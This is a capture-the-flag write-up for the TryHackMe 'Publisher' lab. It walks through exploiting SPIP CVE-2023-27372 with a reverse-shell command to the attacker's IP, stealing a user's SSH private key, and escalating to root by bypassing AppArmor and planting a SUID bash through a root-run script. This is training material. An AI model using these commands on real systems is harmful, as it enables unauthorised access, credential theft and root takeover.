## Writeup for "Publisher" from TryHackMe


First a nmap scan was performed on the target machine to see which ports are available.


```bash
$ nmap -sC -sV 10.10.105.203
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 09:30 EDT
Nmap scan report for 10.10.105.203
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.17 seconds
```


After the nmap scan, it can be seen that there are two ports open, each hosting a ssh and http server respectively. The site hosted on port 80 was visited.


On the site the software SPIP is running, which is a content management system. Based on this, it is inferred that there may be a /spip directory on the site. The directory was found to exist. When visiting the directory, a page appears displaying articles published on the site. Viewing the source code of the page, the following was found:


```html
<meta name="generator" content="SPIP 4.2.0" />
```


Thus, the version of SPIP used on the site was revealled to be 4.2.0. When researching this version of SPIP, it was found to be vulnerable to CVE-2023-27372. A POC of the exploit could be found on exploit-db. This exploit was used to gain a foothold on the box.


CVE-2023-27372 exploits a PHP code injection vulernability in SPIP by making a POST request at the endpoint /spip.php?page=spip_pass with a malicious command in the "oubli" parameter of the request. This vulnerability was the result of improper deserialisation of the string within "oubli" due to the dangerous use of #ENV in SPIP's reset password feature.


To exploit this vulnerability, a netcat listener on port 3096 was opened and the script was executed using the command:


```bash
$ python3 exploit.py -u http://10.10.105.203:80/spip -c '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.4.89.100/3096 0>&1"'
```


A reverse shell as the user www-data on the publisher machine was successfully obtained. In the /home directory on the machine, a user "think" was found and the contents of the "/home/think" directory could be read by the www-data user. The user's id_rsa private key could be found in the user's .ssh directory. This key was then used to log into the machine as the user "think" through ssh.


```bash
$ chmod 600 id_rsa
$ ssh -i id_rsa think@10.10.105.203
```


To execute previleges several approaches were then attempted. First, `sudo -l` was run to check if it was possible to execute any commands as the superuser without a password. This was not allowed. The next step was to search for a SUID binary that was owned by root. Such files, which temporarily give the user running the binary super user previleges while running the binary, could be exploited to become the superuser. The command afor finding such files, and its subsequent output is:


```bash
think@publisher:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwsr-xr-x 1 root root 1183448 Jul  2 13:33 /var/tmp/bash
-rwxr-sr-x 1 root mail 22856 Apr  7  2021 /usr/libexec/camel-lock-helper-1.2
-rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 477672 Dec 18  2023 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwxr-sr-x 1 root utmp 14648 Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-sr-x 1 root root 14488 Dec 13  2023 /usr/lib/xorg/Xorg.wrap
-rwxr-sr-x 1 root shadow 43168 Feb  2  2023 /usr/sbin/pam_extrausers_chkpwd
-rwsr-xr-- 1 root dip 395144 Jul 23  2020 /usr/sbin/pppd
-rwxr-sr-x 1 root shadow 43160 Feb  2  2023 /usr/sbin/unix_chkpwd
-rwsr-sr-x 1 root root 16760 Nov 14  2023 /usr/sbin/run_container
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwxr-sr-x 1 root ssh 350504 Dec 18  2023 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 88464 Nov 29  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 85064 Nov 29  2022 /usr/bin/chfn
-rwxr-sr-x 1 root shadow 84512 Nov 29  2022 /usr/bin/chage
-rwsr-xr-x 1 root root 166056 Apr  4  2023 /usr/bin/sudo
-rwxr-sr-x 1 root tty 14488 Mar 30  2020 /usr/bin/bsd-write
-rwsr-xr-x 1 root root 53040 Nov 29  2022 /usr/bin/chsh
-rwxr-sr-x 1 root shadow 31312 Nov 29  2022 /usr/bin/expiry
-rwsr-xr-x 1 root root 68208 Nov 29  2022 /usr/bin/passwd
-rwsr-xr-x 1 root root 55528 May 30  2023 /usr/bin/mount
-rwsr-xr-x 1 root root 67816 May 30  2023 /usr/bin/su
-rwsr-xr-x 1 root root 44784 Nov 29  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
-rwxr-sr-x 1 root crontab 43720 Feb 13  2020 /usr/bin/crontab
-rwsr-xr-x 1 root root 39144 May 30  2023 /usr/bin/umount
-rwxr-sr-x 1 root tty 35048 May 30  2023 /usr/bin/wall
```


After reading this list of SUID files, one such file was found which is not normally a SUID file on Linux machines, which is /usr/sbin/run_container. Upon reading the source code of this file using strings, the following was obtained:


```bash
think@publisher:~$ strings /usr/sbin/run_container
/lib64/ld-linux-x86-64.so.2
libc.so.6
__stack_chk_fail
execve
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
GLIBC_2.4
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
/bin/bash
/opt/run_container.sh
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
run_container.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
__stack_chk_fail@@GLIBC_2.4
__libc_start_main@@GLIBC_2.2.5
execve@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```


In the contents of the file, it can be seen that /usr/sbin/run_container runs the script /opt/run_container.sh. If malicious code can be written into the script such that when /usr/sbin/run_container is executed, the SUID binary can be exploited to give the attacker escalated previleges.


However, when attempting to view the permissions on this file, this issue occurs:


```bash
think@publisher:~$ ls -lah /opt/run_container.sh
ls: cannot open file '/opt/run_container.sh': Permission denied.
```

To understand why there is no access to /opt/run_container, the attacker must visit /etc/apparmor.d. This directory contains rulesets used by App Armor, a Linux kernel security module that is used to restrict the permissions of each program in the machine.


First, it can be seen that the user is using an ash shell, which can be confirmed through:


```bash
think@publisher:~$ echo $SHELL
/usr/sbin/ash
```


Thus, App Armor would enforce any restrictions specified in the ruleset contained in usr.sbin.ash in /etc/apparmor.d.


```bash
think@publisher:/etc/apparmor.d$ cd /etc/apparmor.d
abi             local            tunables           usr.sbin.mysqld
abstractions    lsb_release      usr.bin.man        usr.sbin.rsyslogd
disable         nvidia_modprobe  usr.sbin.ash       usr.sbin.tcpdump
force-complain  sbin.dhclient    usr.sbin.ippusbxd
think@publisher:/etc/apparmor.d$ ls
think@publisher:/etc/apparmor.d$ cat usr.sbin.ash
#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}
```


It can be seen that read and write permissions are disabled on many directories for users using the ash shell, including in the /opt directory where run_container.sh is found. Note: in the above ruleset, write access is unsuccessfully denied in /var/tmp as the rule should instead be "deny /var/tmp/** w". 


Furthermore, it can be seen that there are no ruleset specified for bash shells. Hence, if the attacker could switch to a bash shell, they would be able to edit run_container.sh and thus escalate their previleges.


This can be done through the following steps:


```bash
think@publisher:/var/tmp$ cp /bin/bash .
think@publisher:/var/tmp$ ./bash
think@publisher:/var/tmp$ vim /opt/run_container.sh
think@publisher:/var/tmp$ cat /opt/run_container.sh
cp /bin/bash /var/tmp
chmod 4755 bash

think@publisher:/var/tmp$ rm ./bash
think@publisher:/var/tmp$ /usr/sbin/run_container
think@publisher:/var/tmp$ ./bash -p
bash-5.0# whoami
root
```


In the above steps, after switching to a bash shell, a malicious script that copies /bin/bash and adds a SUID bit to the copied /bin/bash binary, was used to overwrite /opt/run_container.sh. By executing /usr/sbin/run_container, the new contents of /opt/run_container.sh were executed, leading to /bin/bash being copied and a SUID bit added to that binary while the user had root previleges. Thus, upon executing that copied bash binary, the attack successfully escalated previleges to the root user.


Overall, I found the steps to gain a foothold on the machine and become the "think" user to be straightforward as it involved using a public exploit against SPIP and being able to read the .ssh directory in "think". However, I found the previlege escalation to be much more complicated as it required me to dedicate time to research how App Armor works and how its ruleset within this box could be bypassed.